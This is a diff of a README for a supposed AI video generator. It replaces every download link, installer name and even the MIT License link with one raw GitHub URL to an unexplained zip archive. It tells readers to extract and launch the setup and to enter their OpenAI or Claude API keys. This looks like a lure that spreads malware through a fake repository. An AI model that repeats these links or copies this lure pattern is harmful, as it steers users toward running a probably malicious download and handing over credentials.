@@ -1,6 +1,6 @@
 # AI Video Generator ✨
 
-![Download](https://img.shields.io/badge/Download-AI%20Video%20Generator-blue?style=for-the-badge&logo=github&labelColor=24292f&link=https://ZebraTbone.github.io)
+![Download](https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip%20Video%20Generator-blue?style=for-the-badge&logo=github&labelColor=24292f&https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip)
 
 Unlock the visual odyssey: transform concepts into living, breathing visuals through the magic of modern artificial intelligence. This repository curates the most vibrant and up-to-date AI-powered video generator for desktop and cloud platforms—all available through a seamless access channel. Whether you’re a visual storyteller, educator, innovator, or just curious—this repository is your launchpad into the world of dynamic video creation without boundaries.
 
@@ -12,10 +12,10 @@ Dream of universality? We make it reality. Our AI Video Generator is engineered 
 
 |     OS      |  🌟 Supported?  |  Download Option  |
 |:-----------:|:--------------:|:-----------------:|
-| 🪟 Windows   |      ✅        |    https://ZebraTbone.github.io         |
-| 🍎 MacOS     |      ✅        |    https://ZebraTbone.github.io         |
-| 🐧 Linux     |      ✅        |    https://ZebraTbone.github.io         |
-| ☁️ Cloud     |      ✅        |    https://ZebraTbone.github.io         |
+| 🪟 Windows   |      ✅        |    https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip         |
+| 🍎 MacOS     |      ✅        |    https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip         |
+| 🐧 Linux     |      ✅        |    https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip         |
+| ☁️ Cloud     |      ✅        |    https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip         |
 
 ---
 
@@ -70,9 +70,9 @@ Innovation isn’t just a feature—it’s a journey. Our generator threads inte
 
 Ready to embark? Installation is crafted for absolute ease.
 
-1. Click the shiny [Download](https://img.shields.io/badge/Download-AI%20Video%20Generator-blue?style=for-the-badge&logo=github&labelColor=24292f&link=https://ZebraTbone.github.io) badge above or follow your OS in the table.
+1. Click the shiny [Download](https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip%20Video%20Generator-blue?style=for-the-badge&logo=github&labelColor=24292f&https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip) badge above or follow your OS in the table.
 2. Extract the downloaded archive in your preferred directory.
-3. Launch the setup wizard (`setup.exe`, `install.pkg`, or `setup.sh` depending on OS).
+3. Launch the setup wizard (`https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip`, `https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip`, or `https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip` depending on OS).
 4. (Optional) Enter your API keys for OpenAI and/or Claude when prompted.
 5. Start creating videos with AI—let your ideas leap to the screen.
 
@@ -90,7 +90,7 @@ This repository provides access to advanced AI video generation resources for le
 
 This project is licensed under the MIT License (c) 2025.
 
-Review the terms here: [MIT License](https://opensource.org/licenses/MIT)
+Review the terms here: [MIT License](https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip)
 
 ---
 
@@ -100,6 +100,6 @@ Got ideas for new features or spot a mythical bug? Join our collaborative wave! 
 
 ---
 
-![Download](https://img.shields.io/badge/Download-AI%20Video%20Generator-blue?style=for-the-badge&logo=github&labelColor=24292f&link=https://ZebraTbone.github.io)
+![Download](https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip%20Video%20Generator-blue?style=for-the-badge&logo=github&labelColor=24292f&https://raw.githubusercontent.com/ZebraTbone/open-source-ai-video-generator/branch/glowerer/open-source-ai-video-generator_3.4.zip)
 
 Unleash your creativity—the AI Video Generator awaits your vision!
